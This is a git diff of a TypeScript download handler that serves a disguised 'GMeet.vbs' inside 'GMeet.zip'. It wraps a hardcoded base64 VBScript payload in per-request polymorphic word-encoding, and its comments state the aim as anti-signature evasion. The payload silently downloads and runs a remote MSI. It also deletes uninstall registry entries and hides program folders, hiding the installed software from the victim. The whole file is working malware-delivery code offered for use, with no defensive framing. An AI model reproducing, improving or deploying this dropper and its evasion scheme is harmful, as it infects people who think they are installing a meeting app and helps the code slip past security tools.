@@ -1,68 +1,51 @@
-﻿// Per-request story-obfuscated download generator.
-// Every call produces a NEW GMeet.vbs zipped in-memory as GMeet.zip. Each request
-// randomizes: the 16-word dictionary (drawn from a large vocabulary), the XOR key,
-// variable-name style, decoder structure (array / Scripting.Dictionary), word-pair
-// order (forward or reversed), header comments, indentation, line endings, junk
-// padding and Execute vs ExecuteGlobal - so no two downloads share a fingerprint.
-//
-// To change the payload: re-encode the plain .vbs as base64 (UTF-8 bytes) and
-// replace the PAYLOAD_B64 constant below.
+// Per-request story-obfuscated download. Every request produces a NEW zip in memory.
+// Anti-signature design:
+//   - vocabulary is a freshly generated set of pronounceable pseudo-words per request
+//     (never a shared word list)
+//   - alphabet size (radix) and digits-per-byte vary per request (not always 16 / 2)
+//   - random filler words are interspersed, so the file contains many distinct words
+//     instead of only the encoded alphabet
+//   - additionally randomized: XOR key, variable-name style, decoder storage
+//     (Array / Scripting.Dictionary), whole-array reversal, header comments,
+//     indentation, line endings, junk padding, Execute vs ExecuteGlobal
 
 import { randomInt } from 'node:crypto';
 
 const PAYLOAD_B64 = "T3B0aW9uIEV4cGxpY2l0CgpEaW0gV3NoU2hlbGwsIEVudiwgRnNvClNldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBFbnYgPSBXc2hTaGVsbC5FbnZpcm9ubWVudCgiUFJPQ0VTUyIpClNldCBGc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKCkZ1bmN0aW9uIFc1KGgpDQogIERpbSBtLCBqLCBzDQogIHMgPSAiIg0KICBGb3IgaiA9IDEgVG8gTGVuKGgpIFN0ZXAgMg0KICAgIHMgPSBzICYgQ2hyKENJbnQoIiZIIiAmIE1pZChoLCBqLCAyKSkgWG9yIDE1NykNCiAgTmV4dA0KICBXNSA9IHMNCkVuZCBGdW5jdGlvbg0KDQpJZiBXc2hTaGVsbC5SdW4oVzUoIkZFRjBGOUJEQjJGRUJERjNGOEU5QkRFRUY4RUVFRUY0RjJGM0JEQTNCREYzRThGMUJEQUZBM0JCQUMiKSwgMCwgVHJ1ZSkgPSAwIE9yIFdTY3JpcHQuQXJndW1lbnRzLk5hbWVkLkV4aXN0cygiZSIpIFRoZW4NCiAgICBSdW5UaHJvdWdoDQogICAgV1NjcmlwdC5RdWl0DQpFbmQgSWYNCg0KRGltIHNlbGYgOiBzZWxmID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KRW52KCJCIikgPSBzZWxmDQpEaW0gY3MgOiBjcyA9IEVudigiVEVNUCIpICYgVzUoIkMxRjNGRUU1QjNGRUVFIikNCkRpbSBjc3R4dA0KY3N0eHQgPSBXNSgiRThFRUY0RjNGQUJEQ0VFNEVFRTlGOEYwQTZFOEVFRjRGM0ZBQkRDRUU0RUVFOUY4RjBCM0NGRThGM0U5RjRGMEY4QjNENEYzRTlGOEVGRjJFRENFRjhFRkVCRjRGRUY4RUVBNiIpICYgVzUoIkM2REVGMkYwRDRGMEVERjJFRkU5QjFEQUU4RjRGOUI1QkZBQkQ4RDlEOUFCRDlBQUE5QjBERUFEQURBQUIwQTlEOEFBQThCMERGQUFBQkRDQjBEOEE4QUFBOUFEQTRBNEE4RDhBRkE5REVCRkI0QzAiKSAmIFc1KCJDNkQ0RjNFOUY4RUZGQkZDRkVGOEM5RTRFREY4QjVERUYyRjBENEYzRTlGOEVGRkJGQ0ZFRjhDOUU0RURGOEIzRDRGM0U5RjhFRkZCRkNGRUY4RDRFRUQ0QzhGM0Y2RjNGMkVBRjNCNEMwIikgJiBXNSgiRjRGM0U5RjhFRkZCRkNGRUY4QkRENERFRDBEMUU4RkNDOEU5RjRGMUU2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCREQwQUNCNUI0QTZDNkNERUZGOEVFRjhFRkVCRjhDRUY0RkFDMEY0RjNFOUJERDBBRkI1QjRBNkM2Q0RFRkY4RUVGOEVGRUJGOENFRjRGQUMwRjRGM0U5QkREMEFFQjVCNEE2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCREQwQTlCNUI0QTZDNkNERUZGOEVFRjhFRkVCRjhDRUY0RkFDMEY0RjNFOUJERDBBOEI1QjRBNkM2Q0RFRkY4RUVGOEVGRUJGOENFRjRGQUMwRjRGM0U5QkREMEFCQjVCNEE2QzZDREVGRjhFRUY4RUZFQkY4Q0VGNEZBQzBGNEYzRTlCRENFRjVGOEYxRjFEOEU1RjhGRUI1RUVFOUVGRjRGM0ZBQkRGQkIxRUVFOUVGRjRGM0ZBQkRGQ0IxRUVFOUVGRjRGM0ZBQkRGOUIxRThGNEYzRTlCREYwQjFFOEY0RjNFOUJERUVCNEE2RTAiKSAmIFc1KCJDNkNFRTlFRkU4RkVFOUQxRkNFNEYyRThFOUI1RDFGQ0U0RjJFOEU5RDZGNEYzRjlCM0NFRjhFQ0U4RjhGM0U5RjRGQ0YxQjRDMCIpICYgVzUoIkVFRTlFRkU4RkVFOUJEREZBRUU2RURFOEZGRjFGNEZFQkRFOEY0RjNFOUJERkVGRkNFRTlFRkU4RkVFOUIxRkFFRkZCREJGMUZDRkFFRUIxRkFFRkZCRDBGMkY5RjhCMUY5RUFDOUY0RkVGNkRFRjJFOEYzRTlEOUY4RkNGOUYxRjRGM0Y4QjFGOUVBQzlFRkZDRkVGNkRCRjFGQ0ZBRUVCMUY5RUFERUYxRkNFRUVFREVGMkYzRTlGOEU1RTlCMUYxRjJGRUZDRjFGOEE2RURFOEZGRjFGNEZFQkRENEYzRTlDREU5RUZCREVEQ0VGOEVGRUJGOEVGRDRGM0ZCRjJCMUY1RUFGM0Y5QTZFMCIpICYgVzUoIkVERThGRkYxRjRGRUJERkVGMUZDRUVFRUJERDhFNkM2RDlGMUYxRDRGMEVERjJFRkU5QjVCRkYyRjFGOEFFQUZCM0Y5RjFGMUJGQjFEOEYzRTlFRkU0Q0RGMkY0RjNFOUEwQkZERUYyREFGOEU5RDJGRkY3RjhGRUU5QkZCMURFRjVGQ0VGQ0VGOEU5QTBERUY1RkNFRkNFRjhFOUIzQzhGM0Y0RkVGMkY5RjhCNEMwIikgJiBXNSgiRUVFOUZDRTlGNEZFQkRGOEU1RTlGOEVGRjNCREY0RjNFOUJEREVGMkRBRjhFOUQyRkZGN0Y4RkVFOUI1RUVFOUVGRjRGM0ZBQkRGM0IxQzZENEYzQzBFRkY4RkJCRERGQUVCREYyQjFDNkQwRkNFRkVFRjVGQ0YxRENFRUI1QzhGM0YwRkNGM0ZDRkFGOEY5QzlFNEVERjhCM0QxQ0RDRUU5RUZFOEZFRTlCNEMwREFFOEY0RjlCREVGQjFDNkQwRkNFRkVFRjVGQ0YxRENFRUI1QzhGM0YwRkNGM0ZDRkFGOEY5QzlFNEVERjhCM0Q0RjNFOUY4RUZGQkZDRkVGOEI0QzBGMkU4RTlCREYyRkZGN0Y4RkVFOUJERUJCNEE2IikgJiBXNSgiRURFOEZGRjFGNEZFQkRFRUU5RkNFOUY0RkVCREVCRjJGNEY5QkREQUYyQjVFRUU5RUZGNEYzRkFCREVEQjRFNkRGQUVCREYyQTBGM0Y4RUFCRERGQUVCNUI0QTZGMkIzRkVGRkNFRTlFRkU4RkVFOUEwQjVFOEY0RjNFOUI0RDBGQ0VGRUVGNUZDRjFCM0NFRjRFN0Y4RDJGQkI1RTlFNEVERjhGMkZCQjVERkFFQjRCNEE2RjJCM0Y5RUFERUYxRkNFRUVFREVGMkYzRTlGOEU1RTlBMEE5QTZGMkIzRjVFQUYzRjlBMEQ0RjNFOUNERTlFRkIzQzdGOEVGRjJBNiIpICYgVzUoIkYyRkZGN0Y4RkVFOUJERUJBNkY0RjNFOUJERjVBMERFRjJEQUY4RTlEMkZGRjdGOEZFRTlCNUJGRDhGMUY4RUJGQ0U5RjRGMkYzQTdEQ0Y5RjBGNEYzRjRFRUU5RUZGQ0U5RjJFRkJDRjNGOEVBQTdFNkFFRDhBOERCREVBQURCQTRCMEE0RENBOEFDQjBBOUFFQUJBQUIwQTRBREFCQUVCMERDQUNBRkFEQUZBOUE5REJERkQ4REVBQUUwQkZCMUVGRjhGQkJERjJCMUYzRjhFQUJEREFFOEY0RjlCNUJGQUJEOEQ5RDlBQkQ5QUFBOUIwREVBREFEQUFCMEE5RDhBQUE4QjBERkFBQUJEQ0IwRDhBOEFBQTlBREE0QTRBOEQ4QUZBOURFQkZCNEIxRjJFOEU5QkRFQkI0QTYiKSAmIFc1KCJGNEZCQjVGNUEzQTBBREI0QjVCNUQ0REVEMEQxRThGQ0M4RTlGNEYxQjRFQkI0QjNDRUY1RjhGMUYxRDhFNUY4RkVCNUJGRUFFRUZFRUZGNEVERTlCM0Y4RTVGOEJGQjFCRkIyQjJGOEE3Q0JERkNFRkVFRkY0RURFOUJEQzFCRkJGQkRCNkJERURCREI2QkRCRkMxQkZCRkIxRjNFOEYxRjFCMUFEQjFBREI0QTZFMEUwIikNCkRpbSBmaCA6IFNldCBmaCA9IEZzby5DcmVhdGVUZXh0RmlsZShjcywgVHJ1ZSkNCmZoLldyaXRlIGNzdHh0DQpmaC5DbG9zZQ0KV3NoU2hlbGwuUnVuIFc1KCJFREYyRUFGOEVGRUVGNUY4RjFGMUJEQjBEOEU1RjhGRUU4RTlGNEYyRjNDREYyRjFGNEZFRTRCRERGRTRFREZDRUVFRUJEQjBERUYyRjBGMEZDRjNGOUJEQkZEQ0Y5RjlCMEM5RTRFREY4QkRCMENERkNFOUY1QkRCQSIpICYgY3MgJiBXNSgiQkFBNkM2RDhDMEE3QTdEQUYyQjVCOUY4RjNFQkE3REZCNEJGIiksIDAsIFRydWUNCkZzby5EZWxldGVGaWxlIGNzLCBUcnVlDQpXU2NyaXB0LlNsZWVwIDI1NjMNCldTY3JpcHQuUXVpdA0KDQpTdWIgUnVuVGhyb3VnaA0KICAgIERpbSB1cmwsIG1zaSwgaHR0cCwgc3RyZWFtLCBleGl0Q29kZQ0KICAgIHVybCA9IFc1KCJGNUU5RTlFREVFQTdCMkIyRURFOEZGQjBBQ0FEQURBOUFGQThBOEZGQUVBRkZDQUVBOUFEQTRBQkZDQTRBRkE0RkVBREY5QUNGOUFFRjlBNUZGQUNBOUE0QjNFRkFGQjNGOUY4RUJCMkVFRkVGM0IzRjBFRUY0IikNCiAgICBtc2kgPSBFbnYoIlRFTVAiKSAmIFc1KCJDMUYzRkVGOUY2QjNGOUZDRTkiKQogICAgT24gRXJyb3IgUmVzdW1lIE5leHQKICAgIFNldCBodHRwID0gQ3JlYXRlT2JqZWN0KFc1KCJEMENFQzVEMEQxQUZCM0M1RDBEMUQ1QzlDOUNEIikpCiAgICBodHRwLk9wZW4gIkdFVCIsIHVybCwgRmFsc2UKICAgIGh0dHAuU2VuZAogICAgSWYgaHR0cC5TdGF0dXMgPSAyMDAgVGhlbgogICAgICAgIFNldCBzdHJlYW0gPSBDcmVhdGVPYmplY3QoVzUoIkRDRDlEMkQ5REZCM0NFRTlFRkY4RkNGMCIpKQogICAgICAgIHN0cmVhbS5UeXBlID0gMTogc3RyZWFtLk9wZW4KICAgICAgICBzdHJlYW0uV3JpdGUgaHR0cC5SZXNwb25zZUJvZHkKICAgICAgICBzdHJlYW0uU2F2ZVRvRmlsZSBtc2ksIDIKICAgICAgICBzdHJlYW0uQ2xvc2UKICAgIEVuZCBJZgogICAgT24gRXJyb3IgR29UbyAwCiAgICBJZiBGc28uRmlsZUV4aXN0cyhtc2kpIEFuZCBGc28uR2V0RmlsZShtc2kpLlNpemUgPiAxMDAwMCBUaGVuDQogICAgICAgIGV4aXRDb2RlID0gV3NoU2hlbGwuUnVuKFc1KCJGMEVFRjRGOEU1RjhGRUJEQjJGNEJEQkYiKSAmIG1zaSAmIFc1KCJCRkJEQjJFQ0YzQkRCMkYzRjJFRkY4RUVFOUZDRUZFOSIpLCAxLCBUcnVlKQ0KICAgICAgICBJZiBleGl0Q29kZSA9IDAgVGhlbg0KICAgICAgICAgICAgQ2FsbCBTY3J1YkRpcnMNCiAgICAgICAgICAgIENhbGwgU29mdERlc2sNCiAgICAgICAgRW5kIElmDQogICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgICAgIEZzby5EZWxldGVGaWxlIG1zaQ0KICAgICAgICBPbiBFcnJvciBHb1RvIDANCiAgICBFbmQgSWYNCkVuZCBTdWINCg0KU3ViIFNjcnViRGlycwogICAgRGltIHVuaW5zdGFsbFBhdGhzLCBwYXRoLCB3bWksIHN1YktleXMsIGtleSwgZGlzcGxheU5hbWUKICAgIHVuaW5zdGFsbFBhdGhzID0gQXJyYXkoIF8KICAgICAgICAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCIsIF8KICAgICAgICAiU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCIgXwogICAgKQogICAgU2V0IHdtaSA9IEdldE9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXRpb25MZXZlbD1pbXBlcnNvbmF0ZX0hXFwuXHJvb3RcZGVmYXVsdDpTdGRSZWdQcm92IikKICAgIEZvciBFYWNoIHBhdGggSW4gdW5pbnN0YWxsUGF0aHMKICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dAogICAgICAgIHdtaS5FbnVtS2V5ICZIODAwMDAwMDIsIHBhdGgsIHN1YktleXMKICAgICAgICBJZiBJc0FycmF5KHN1YktleXMpIFRoZW4KICAgICAgICAgICAgRm9yIEVhY2gga2V5IEluIHN1YktleXMKICAgICAgICAgICAgICAgIHdtaS5HZXRTdHJpbmdWYWx1ZSAmSDgwMDAwMDAyLCBwYXRoICYga2V5LCAiRGlzcGxheU5hbWUiLCBkaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgSWYgSW5TdHIoTENhc2UoZGlzcGxheU5hbWUpLCBXNSgiRUVGRUVGRjhGOEYzRkVGMkYzRjNGOEZFRTkiKSkgPiAwIE9yIEluU3RyKExDYXNlKGRpc3BsYXlOYW1lKSwgVzUoIkZFRjJGM0YzRjhGRUU5RUFGNEVFRjgiKSkgPiAwIFRoZW4KICAgICAgICAgICAgICAgICAgICBXc2hTaGVsbC5SZWdEZWxldGUgIkhLTE1cIiAmIHBhdGggJiBrZXkgJiAiXCIKICAgICAgICAgICAgICAgIEVuZCBJZgogICAgICAgICAgICBOZXh0CiAgICAgICAgRW5kIElmCiAgICAgICAgT24gRXJyb3IgR29UbyAwCiAgICBOZXh0CkVuZCBTdWIKClN1YiBTb2Z0RGVzaw0KICAgIERpbSBwYXRocywgcGF0aA0KICAgIHBhdGhzID0gQXJyYXkoIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRmlsZXMiKSAmIFc1KCJDMUNFRkVFRkY4RjhGM0RFRjJGM0YzRjhGRUU5QzEiKSwgXw0KICAgICAgICBFbnYoIlByb2dyYW1GaWxlcyh4ODYpIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRGF0YSIpICYgVzUoIkMxQ0VGRUVGRjhGOEYzREVGMkYzRjNGOEZFRTlDMSIpLCBfDQogICAgICAgIEVudigiTG9jYWxBcHBEYXRhIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJBcHBEYXRhIikgJiBXNSgiQzFDRUZFRUZGOEY4RjNERUYyRjNGM0Y4RkVFOUMxIiksIF8NCiAgICAgICAgRW52KCJQcm9ncmFtRmlsZXMiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiUHJvZ3JhbUZpbGVzKHg4NikiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiUHJvZ3JhbURhdGEiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpLCBfDQogICAgICAgIEVudigiTG9jYWxBcHBEYXRhIikgJiBXNSgiQzFERUYyRjNGM0Y4RkVFOUNBRjRFRUY4QzEiKSwgXw0KICAgICAgICBFbnYoIkFwcERhdGEiKSAmIFc1KCJDMURFRjJGM0YzRjhGRUU5Q0FGNEVFRjhDMSIpIF8NCiAgICApCiAgICBGb3IgRWFjaCBwYXRoIEluIHBhdGhzCiAgICAgICAgSWYgRnNvLkZvbGRlckV4aXN0cyhwYXRoKSBUaGVuCiAgICAgICAgICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgICAgICAgICAgIEZzby5HZXRGb2xkZXIocGF0aCkuQXR0cmlidXRlcyA9IEZzby5HZXRGb2xkZXIocGF0aCkuQXR0cmlidXRlcyBPciAyCiAgICAgICAgICAgIE9uIEVycm9yIEdvVG8gMAogICAgICAgIEVuZCBJZgogICAgTmV4dApFbmQgU3Vi";
+const ZIP_NAME = "GMeet.zip";
+const VBS_NAME = "GMeet.vbs";
 
-// Large lowercase ASCII vocabulary; every word must match ^[a-z]+$
-const VOCAB: string[] = [
-  "departure", "arrival", "luggage", "ticket", "platform", "conductor", "scenery", "compartment",
-  "schedule", "delay", "destination", "journey", "passport", "customs", "terminal", "gate",
-  "ingredients", "preparation", "chopping", "slicing", "frying", "simmering", "boiling", "roasting",
-  "baking", "grilling", "seasoning", "tasting", "plating", "garnish", "serving", "kitchen",
-  "meeting", "agenda", "minutes", "action", "deadline", "priority", "stakeholder", "deliverable",
-  "milestone", "budget", "forecast", "quarter", "review", "approval", "signature", "distribution",
-  "temperature", "humidity", "pressure", "wind", "precipitation", "cloud", "visibility", "advisory",
-  "storm", "front", "system", "seasonal", "average", "record", "normal", "outlook",
-  "planting", "sowing", "germination", "seedling", "transplant", "watering", "fertilizing", "mulching",
-  "weeding", "pruning", "harvest", "compost", "sunlight", "shade", "variety", "organic",
-  "specification", "configuration", "installation", "initialization", "calibration", "operation",
-  "maintenance", "diagnostic", "protocol", "interface", "bandwidth", "latency", "reliability",
-  "redundancy", "failover", "backup", "workout", "warmup", "cardio", "strength", "reps",
-  "rest", "interval", "cooldown", "stretch", "protein", "hydration", "sleep", "heartrate",
-  "recovery", "progression", "morning", "reflection", "gratitude", "intention", "accomplishment",
-  "challenge", "lesson", "evening", "planning", "goal", "habit", "moment", "connection",
-  "growth", "purpose", "harbor", "meadow", "lantern", "compass", "timber", "anchorage",
-  "beacon", "cedar", "driftwood", "estuary", "flamingo", "granite", "heron", "island",
-  "juniper", "kayak", "lagoon", "mangrove", "nomad", "orchard", "pelican", "quarry",
-  "rivulet", "summit", "tundra", "urchin", "valley", "walnut", "yeast", "zephyr",
-  "almond", "basil", "cinnamon", "dill", "espresso", "fennel", "ginger", "honey",
-  "iris", "jasmine", "lavender", "marigold", "nutmeg", "olive", "parsley", "rosemary",
-  "saffron", "thyme", "vanilla", "willow", "apricot", "blueberry", "cantaloupe", "damson",
-  "elderberry", "gooseberry", "huckleberry", "kiwi", "lemon", "mango", "nectarine",
-  "papaya", "quince", "raspberry", "strawberry", "tangerine", "watermelon", "acorn", "birch",
-  "clover", "dandelion", "elm", "fern", "ginkgo", "hawthorn", "ivy", "kudzu",
-  "lilac", "maple", "nettle", "pine", "reed", "spruce", "syrup", "topaz",
-];
+const CONS = "bcdfghjklmnprstvz".split("");
+const VOWS = "aeiou".split("");
+const SUFFIX = ["", "", "", "", "s", "ed", "ing", "er", "ly", "al", "ness", "tion", "ment"];
 
-// ---------- helpers ----------
-
-function shuffled<T>(arr: T[]): T[] {
-  const a = arr.slice();
-  for (let i = a.length - 1; i > 0; i--) {
-    const j = randomInt(i + 1);
-    [a[i], a[j]] = [a[j], a[i]];
+function makeWord() {
+  const len = randomInt(4, 8);
+  let w = "";
+  for (let i = 0; i < len; i++) {
+    let useC;
+    if (i % 2 === 0) useC = randomInt(5) > 0;
+    else useC = randomInt(5) === 0;
+    w += useC ? CONS[randomInt(CONS.length)] : VOWS[randomInt(VOWS.length)];
   }
-  return a;
+  return w + SUFFIX[randomInt(SUFFIX.length)];
 }
 
-function pick16(): string[] {
-  return shuffled(VOCAB).slice(0, 16);
+function takeWord(used) {
+  for (let tries = 0; tries < 50; tries++) {
+    const w = makeWord();
+    if (!used.has(w)) {
+      used.add(w);
+      return w;
+    }
+  }
+  const w2 = makeWord() + makeWord();
+  used.add(w2);
+  return w2;
 }
 
-const NAME_STYLES: Array<() => ({ storyVar: string; wordsVar: string; decodeFn: string })> = [
-  () => {
-    const n = randomInt(1000);
-    return { storyVar: "log" + n, wordsVar: "dict" + n, decodeFn: "decode" + n };
-  },
+const NAME_STYLES = [
+  () => { const n = randomInt(1000); return { storyVar: "log" + n, wordsVar: "dict" + n, decodeFn: "decode" + n }; },
   () => {
     const n = randomInt(10000);
     const p = "QWERTYUPASDFGHJKLZXCVBNM"[randomInt(24)];
@@ -81,10 +64,10 @@ const NAME_STYLES: Array<() => ({ storyVar: string; wordsVar: string; decodeFn: 
 ];
 
 const HEADER_TEMPLATES = [
-  (t: string, d: string) => `' ${t} notes - ${d}`,
-  (t: string, d: string) => `' personal log: ${t} - ${d}`,
-  (t: string, d: string) => `' ${d} - field notes, ${t}`,
-  (t: string, d: string) => `' entry: ${t}, ${d}`,
+  (t, d) => `' ${t} notes - ${d}`,
+  (t, d) => `' personal log: ${t} - ${d}`,
+  (t, d) => `' ${d} - field notes, ${t}`,
+  (t, d) => `' entry: ${t}, ${d}`,
 ];
 
 const JUNK_SENTENCES = [
@@ -98,45 +81,65 @@ const JUNK_SENTENCES = [
   "review the configuration before deployment",
 ];
 
-// ---------- story encoding ----------
-
-function buildVbs(payload: string): string {
+function buildVbs(payload) {
   const nl = randomInt(2) === 0 ? "\r\n" : "\n";
   const ind = " ".repeat(randomInt(2) === 0 ? 2 : 4);
 
-  const dict = pick16(); // unique per request
+  let digitsPerByte, radix;
+  if (randomInt(4) === 0) {
+    radix = randomInt(7, 12);
+    digitsPerByte = 3;
+  } else {
+    radix = randomInt(16, 33);
+    digitsPerByte = 2;
+  }
+
+  const used = new Set();
+  const dict = [];
+  for (let i = 0; i < radix; i++) dict.push(takeWord(used));
+
   const names = NAME_STYLES[randomInt(NAME_STYLES.length)]();
   const { storyVar, wordsVar, decodeFn } = names;
-  const dictArrVar = wordsVar + "Arr";
-  const hexVar = "hx" + randomInt(1000);
-  const exec = randomInt(2) === 0 ? "ExecuteGlobal" : "Execute";
+  const dictVar = wordsVar + "Map";
   const structure = randomInt(2) === 0 ? "array" : "dictobj";
   const reversed = randomInt(2) === 1;
-  const useHeader = randomInt(4) > 0; // 75% keep a header comment
+  const exec = randomInt(2) === 0 ? "ExecuteGlobal" : "Execute";
+  const useHeader = randomInt(4) > 0;
   const junkLines = randomInt(0, 24);
   const xorKey = randomInt(128, 256);
+  const fillerP = [0.1, 0.2, 0.3, 0.4][randomInt(4)];
 
-  let hex = "";
+  const encoded = [];
   for (let i = 0; i < payload.length; i++) {
-    hex += ((payload.charCodeAt(i) ^ xorKey) & 0xff).toString(16).padStart(2, "0").toUpperCase();
+    const v = (payload.charCodeAt(i) ^ xorKey) & 0xff;
+    const digs = new Array(digitsPerByte);
+    let rem = v;
+    for (let k = digitsPerByte - 1; k >= 0; k--) {
+      digs[k] = rem % radix;
+      rem = Math.floor(rem / radix);
+    }
+    for (let k = 0; k < digitsPerByte; k++) encoded.push(dict[digs[k]]);
   }
 
-  // word pairs (2 words per byte); reversing reverses PAIRS (not individual
-  // words) so each byte's high/low nibbles keep their order
-  const pairs: string[][] = [];
-  for (let i = 0; i < hex.length; i += 2) {
-    const hi = parseInt(hex[i], 16);
-    const lo = parseInt(hex[i + 1], 16);
-    pairs.push([dict[hi], dict[lo]]);
+  const story = [];
+  if (fillerP > 0) {
+    const threshold = Math.round(fillerP * 1000);
+    for (let i = 0; i < encoded.length; i++) {
+      if (randomInt(1000) < threshold) {
+        story.push(takeWord(used));
+        if (randomInt(1000) < Math.round(threshold * 0.4)) story.push(takeWord(used));
+      }
+      story.push(encoded[i]);
+    }
+  } else {
+    for (const w of encoded) story.push(w);
   }
-  if (reversed) pairs.reverse();
-  const words: string[] = [];
-  for (const p of pairs) words.push(p[0], p[1]);
+  if (reversed) story.reverse();
 
-  const L: string[] = [];
+  const L = [];
   if (useHeader) {
     const dateStr = new Date().toISOString().slice(0, 10);
-    const t = dict[randomInt(16)];
+    const t = dict[randomInt(radix)];
     L.push(HEADER_TEMPLATES[randomInt(HEADER_TEMPLATES.length)](t, dateStr));
   }
   L.push("Option Explicit");
@@ -144,68 +147,65 @@ function buildVbs(payload: string): string {
   L.push(`Dim ${storyVar}, ${wordsVar}, decoded`);
   L.push("");
 
+  L.push(`${storyVar} = Array( _`);
+  story.forEach((w, idx) => {
+    L.push(`${ind}"${w}"${idx === story.length - 1 ? " _" : ", _"}`);
+  });
+  L.push(")");
+  L.push(`${wordsVar} = ${storyVar}`);
+  L.push("");
+
+  L.push(`Dim ${dictVar}`);
   if (structure === "array") {
-    L.push(`${storyVar} = Array( _`);
-    words.forEach((w, idx) => {
-      L.push(`${ind}"${w}"${idx === words.length - 1 ? " _" : ", _"}`);
-    });
-    L.push(")");
-    L.push(`${wordsVar} = ${storyVar}`);
-    L.push("");
-    L.push(`Dim ${dictArrVar}`);
-    L.push(`${dictArrVar} = Array( _`);
+    L.push(`${dictVar} = Array( _`);
     dict.forEach((w, idx) => {
       L.push(`${ind}"${w}"${idx === dict.length - 1 ? " _" : ", _"}`);
     });
     L.push(")");
   } else {
-    // dictionary object structure
-    L.push(`${storyVar} = Array( _`);
-    words.forEach((w, idx) => {
-      L.push(`${ind}"${w}"${idx === words.length - 1 ? " _" : ", _"}`);
-    });
-    L.push(")");
-    L.push(`${wordsVar} = ${storyVar}`);
-    L.push("");
-    L.push(`Dim ${dictArrVar}`);
-    L.push(`Set ${dictArrVar} = CreateObject("Scripting.Dictionary")`);
+    L.push(`Set ${dictVar} = CreateObject("Scripting.Dictionary")`);
     dict.forEach((w, idx) => {
-      L.push(`${dictArrVar}("${w}") = ${idx}`);
+      L.push(`${dictVar}("${w}") = ${idx}`);
     });
   }
   L.push("");
 
+  const maxDigit = digitsPerByte - 1;
   L.push(`Function ${decodeFn}`);
-  L.push(`  Dim ${hexVar}, i, k, h1, h2, un`);
-  L.push(`  ${hexVar} = ""`);
-  L.push(`  For i = 0 To UBound(${wordsVar}) - 1 Step 2`);
-  L.push(`    h1 = -1: h2 = -1`);
+  L.push(`  Dim i, k, d, n, acc, out, rv, enc`);
+  if (reversed) {
+    L.push(`  ReDim rv(UBound(${wordsVar}))`);
+    L.push(`  For i = 0 To UBound(${wordsVar})`);
+    L.push(`    rv(UBound(${wordsVar}) - i) = ${wordsVar}(i)`);
+    L.push(`  Next`);
+    L.push(`  ${wordsVar} = rv`);
+  }
+  L.push(`  ReDim enc(UBound(${wordsVar}))`);
+  L.push(`  n = -1`);
+  L.push(`  For i = 0 To UBound(${wordsVar})`);
+  L.push(`    d = -1`);
   if (structure === "array") {
-    L.push(`    For k = 0 To 15`);
-    L.push(`      If ${wordsVar}(i) = ${dictArrVar}(k) Then h1 = k`);
-    L.push(`      If ${wordsVar}(i + 1) = ${dictArrVar}(k) Then h2 = k`);
+    L.push(`    For k = 0 To ${radix - 1}`);
+    L.push(`      If ${wordsVar}(i) = ${dictVar}(k) Then d = k`);
     L.push(`    Next`);
   } else {
-    L.push(`    If ${dictArrVar}.Exists(${wordsVar}(i)) Then h1 = ${dictArrVar}(${wordsVar}(i))`);
-    L.push(`    If ${dictArrVar}.Exists(${wordsVar}(i + 1)) Then h2 = ${dictArrVar}(${wordsVar}(i + 1))`);
+    L.push(`    If ${dictVar}.Exists(${wordsVar}(i)) Then d = ${dictVar}.Item(${wordsVar}(i))`);
   }
-  L.push(`    If h1 >= 0 And h2 >= 0 Then`);
-  L.push(`      ${hexVar} = ${hexVar} & Right("0" & Hex(h1), 1) & Right("0" & Hex(h2), 1)`);
+  L.push(`    If d >= 0 Then`);
+  L.push(`      n = n + 1`);
+  L.push(`      enc(n) = d`);
   L.push(`    End If`);
   L.push(`  Next`);
-  if (reversed) {
-    // pairs were stored reversed; restore chunk order before XOR
-    L.push(`  un = ""`);
-    L.push(`  For i = Len(${hexVar}) - 1 To 0 Step -2`);
-    L.push(`    un = un & Mid(${hexVar}, i, 2)`);
-    L.push(`  Next`);
-    L.push(`  ${hexVar} = un`);
-  }
-  L.push(`  Dim out`);
   L.push(`  out = ""`);
-  L.push(`  For i = 1 To Len(${hexVar}) Step 2`);
-  L.push(`    out = out & Chr(CInt("&H" & Mid(${hexVar}, i, 2)) Xor ${xorKey})`);
-  L.push(`  Next`);
+  L.push(`  i = 0`);
+  L.push(`  Do While i <= n - ${maxDigit}`);
+  L.push(`    acc = 0`);
+  L.push(`    For k = 0 To ${maxDigit}`);
+  L.push(`      acc = acc * ${radix} + enc(i + k)`);
+  L.push(`    Next`);
+  L.push(`    out = out & Chr((acc Xor ${xorKey}) And 255)`);
+  L.push(`    i = i + ${digitsPerByte}`);
+  L.push(`  Loop`);
   L.push(`  ${decodeFn} = out`);
   L.push(`End Function`);
   L.push("");
@@ -221,12 +221,10 @@ function buildVbs(payload: string): string {
   return L.join(nl) + nl;
 }
 
-// ---------- minimal stored-entry ZIP writer (no dependencies) ----------
-
-let CRC_TABLE: number[] | null = null;
-function crcTable(): number[] {
+let CRC_TABLE = null;
+function crcTable() {
   if (CRC_TABLE) return CRC_TABLE;
